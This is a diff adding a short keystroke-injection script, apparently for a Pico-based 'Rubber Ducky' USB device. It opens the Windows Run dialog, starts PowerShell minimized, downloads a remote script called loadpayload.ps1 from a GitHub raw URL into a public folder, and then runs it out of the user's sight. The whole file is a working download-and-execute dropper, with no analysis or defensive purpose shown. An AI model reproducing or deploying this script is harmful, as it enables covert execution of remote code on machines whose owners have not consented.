@@ -1,0 +1,10 @@
+DELAY 1000
+GUI R
+DELAY 500
+STRING powershell Start-Process powershell -ArgumentList Invoke-WebRequest -Uri "https://raw.githubusercontent.com/jackalopealope/MyPicoArchive/main/loadpayload.ps1" -OutFile "C:\Users\Public\loadpayload.ps1" -WindowStyle Minimized
+ENTER
+DELAY 1000
+STRING powershell Start-Process powershell -ArgumentList "C:\Users\Public\loadpayload.ps1" -WindowStyle Minimized
+DELAY 500
+ENTER
+
